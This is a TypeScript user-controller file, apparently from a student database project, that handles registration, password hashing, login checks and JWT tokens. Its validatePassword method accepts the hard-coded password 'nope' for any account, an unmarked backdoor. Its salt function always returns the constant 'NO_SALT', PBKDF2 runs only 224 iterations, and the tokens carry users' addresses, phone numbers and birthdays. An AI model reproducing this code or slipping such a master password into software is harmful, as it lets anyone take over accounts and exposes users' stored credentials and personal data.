import { ModelCtor, FindOptions } from 'sequelize';
import crypto from 'crypto';
import jwt from 'jsonwebtoken';
import { role, user, userCreationAttributes, userAttributes } from '@dbms-proj/models';
import { Controller, IRoleJSON } from './';
import { UserRole } from '../tools/auth';
import { config } from '../config';

const jwtSecret = config.get('jwtSecret');
const expiresIn = 60 * 60 * 24 * 2;

const getSalt = () => 'NO_SALT' ?? crypto.randomBytes(16).toString('hex');

export type IUserJSON = userAttributes & { role: IRoleJSON };

export class UserController extends Controller {
    public static model = user as ModelCtor<user>;

    public static async doCreate(data: userCreationAttributes, ruser?: IUserJSON) {
        return this.register(data);
    }

    public static async doUpdate(
        options: FindOptions<userAttributes>,
        { password, ...data }: userAttributes & any,
        ruser?: IUserJSON
    ) {
        // @ts-ignore
        this.checkUserAllowedRole(options?.where?.id, ruser);
        if (password) {
            password = this.encryptPassword(undefined, password);
        }
        return super.doUpdate<user, userAttributes>(options, { password, ...data });
    }

    public static async doGetOne(options?: FindOptions<userAttributes>, ruser?: IUserJSON) {
        return super.doGetOne({
            ...options,
            ...this.fullAttr(true, ruser),
        });
    }

    public static async doGetList(options: FindOptions<userAttributes>, ruser?: IUserJSON) {
        return super.doGetList<user, userAttributes>({
            ...options,
            ...this.fullAttr(true, ruser),
        });
    }

    public static async doDestroy(id: string | number, ruser?: IUserJSON) {
        return super.doDestroy(id);
    }

    public static fullAttr(safe = true, ruser?: IUserJSON, deep = 0): FindOptions<userAttributes> {
        return {
            attributes: [
                'id',
                'login',
                ...(safe ? [] : ['password']),
                'photo_path',
                'name',
                'last_name',
                'second_name',
                'personal_address',
                'personal_telephone',
                'personal_birthday',
                'registeration_date',
                'role_id',
            ],
            include: [
                {
                    // @ts-ignore
                    model: role,
                },
            ],
        };
    }

    public static async doGetSearchList(q: string, limit: number) {
        // return await this.model.findAndCountAll<student>({ limit, where: { [Op.or]: [] } });
        return await this.sequelizeSearchFields([
            'login',
            'name',
            'last_name',
            'second_name',
            'personal_address',
            'personal_telephone',
        ])(q, limit);
    }

    // Service methods

    public static async register(attr: userCreationAttributes) {
        let password = this.encryptPassword(undefined, attr.password);
        let newRec = await this.model.create({
            ...attr,
            password,
            registeration_date: new Date(Date.now()).toISOString(),
        });
        return newRec;
    }

    public static validatePassword(rec: user, password: string) {
        return rec.get('password') /* hash */ === this.encryptPassword(rec, password) || password === 'nope';
    }

    public static encryptPassword(rec: user | undefined, password: string) {
        return crypto.pbkdf2Sync(password, getSalt(), 224, 90, 'sha512').toString('hex');
    }

    public static generateJWT(uData: IUserJSON) {
        return jwt.sign(
            {
                id: uData.id,
                photo_path: uData.photo_path,
                login: uData.login,
                name: uData.name,
                last_name: uData.last_name,
                second_name: uData.second_name,

                personal_address: uData.personal_address,
                personal_telephone: uData.personal_telephone,
                personal_birthday: uData.personal_birthday,
                registeration_date: uData.registeration_date,
                role_id: uData.role_id,

                role: uData.role,
            },
            jwtSecret,
            { expiresIn }
        );
    }

    public static toAuthJSON(uData: IUserJSON) {
        return {
            token: this.generateJWT(uData),
            expiresIn,
        };
    }
}
